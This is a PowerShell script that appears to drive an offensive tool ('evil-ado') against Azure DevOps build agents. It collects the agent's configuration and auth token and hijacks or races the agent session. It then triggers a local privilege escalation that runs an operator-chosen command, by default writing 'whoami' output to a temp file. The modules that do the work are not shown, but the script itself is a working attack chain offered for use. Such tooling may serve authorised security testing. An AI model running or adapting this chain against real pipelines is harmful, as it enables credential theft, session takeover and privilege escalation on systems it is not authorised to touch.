param(
    [string]$AgentPath = "C:\agent"
)

$ErrorActionPreference = "Stop"
$scriptRoot = Split-Path -Parent $MyInvocation.MyCommand.Path

# ── Load common libs ──
. "$scriptRoot\lib\logging.ps1"
. "$scriptRoot\lib\agent-collector.ps1"
. "$scriptRoot\lib\auth.ps1"
. "$scriptRoot\lib\session-common.ps1"

# ── Start ──
Write-Banner

# Create run folder: <scriptRoot>/runs/<timestamp>/
$script:RunTimestamp = Get-Date -Format "yyyyMMdd-HHmmss"
$script:RunDir = Join-Path $scriptRoot "runs\$($script:RunTimestamp)"
New-Item -ItemType Directory -Path $script:RunDir -Force | Out-Null
$script:LogFile = Join-Path $script:RunDir "evil-ado.log"
Write-Log "Run folder: $($script:RunDir)" -Severity Info
Write-Host ""

# Collect agent info + auth
$agent = Get-AgentInfo -AgentPath $AgentPath
$auth  = Get-AgentToken -AgentInfo $agent

# Save agent.log
Save-AgentLog -AgentInfo $agent -Auth $auth

# CMD input
$hookCommand = ""
$hookCommand = Read-Host "  Command to run [default: whoami > C:\temp\escalated_identity_<ts>.txt]"
if (-not $hookCommand) { $hookCommand = "" }
Write-Host ""

# Session hijack
$session = $null
if ($agent.IsDeploymentGroup) {
    . "$scriptRoot\lib\session-depgroup.ps1"
    $session = Invoke-SessionRace -AgentInfo $agent -Auth $auth
} else {
    . "$scriptRoot\lib\session-selfhosted.ps1"
    $session = Invoke-SessionHijack -AgentInfo $agent -Auth $auth
}
Save-SessionLog -Session $session -Auth $auth
Save-PipelineJson -Session $session

# LPE Execute
if (-not $agent.IsDeploymentGroup) {
    . "$scriptRoot\lib\lpe-selfhosted.ps1"
    Invoke-LpeSelfHosted -AgentInfo $agent -Auth $auth -Session $session -HookCommand $hookCommand
} else {
    . "$scriptRoot\lib\lpe-depgroup.ps1"
    Invoke-LpeDepGroup -AgentInfo $agent -Auth $auth -Session $session -HookCommand $hookCommand
}

